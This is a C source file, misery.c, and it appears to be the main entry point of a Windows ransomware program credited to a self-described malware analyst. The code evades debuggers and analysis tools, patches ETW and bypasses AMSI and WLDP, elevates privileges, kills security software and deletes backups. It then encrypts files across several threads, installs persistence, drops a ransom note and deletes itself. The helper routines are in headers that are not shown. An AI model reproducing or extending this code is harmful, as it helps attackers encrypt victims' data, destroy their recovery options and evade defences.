/*
 * misery.c
 * Author  : Jahanzaib Ashraf Mir
 * Role    : Cybersecurity Researcher | Malware Analyst | AI/ML | Ethical Hacker
 *
 * Contact :
 *   GitHub  : https://github.com/jahanzaibmir
 *   LinkedIn : https://linkedin.com/jahanzaibmir
 *   InstaGram : https://instagram.com/jahanzaibmir_
 */

#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <process.h>

#include "crypto.h"
#include "defense.h"
#include "security.h"
#include "persistence.h"
#include "utils.h"

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    /* ── Single instance check ── */
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\StashCat_V2");
    if (!hMutex || GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    /* ── Anti-analysis check ── */
    if (IsBeingDebugged() || DetectAnalysisTools()) {
        Sleep(60000);
        CloseHandle(hMutex);
        return 0;
    }

    /* ── Patch defense subsystems ── */
    EtwPatcher();
    AmsiBypass();
    WldpBypass();
    HideFromDebugger();

    /* ── Elevate ── */
    ElevatePrivileges();

    /* ── Kill security ── */
    KillSecurity();

    /* ── Nuke backups ── */
    NukeBackups();

    /* ── Initialize crypto ── */
    if (!InitCrypto()) {
        CloseHandle(hMutex);
        return 1;
    }

    /* ── Multi-threaded encryption ── */
    SYSTEM_INFO si_sys;
    GetSystemInfo(&si_sys);
    int n = si_sys.dwNumberOfProcessors * 2;
    if (n > 8) n = 8;

    HANDLE threads[8];
    for (int i = 0; i < n; i++) {
        threads[i] = (HANDLE)_beginthreadex(NULL, 0, EncryptionWorker, NULL, 0, NULL);
    }

    WaitForMultipleObjects(n, threads, TRUE, 180000); /* 3 min timeout */
    for (int i = 0; i < n; i++) CloseHandle(threads[i]);

    /* ── Persistence + Note ── */
    InstallPersistence();
    DropNote();

    /* ── Cleanup ── */
    CleanupCrypto();
    SelfDelete();

    CloseHandle(hMutex);
    return 0;
}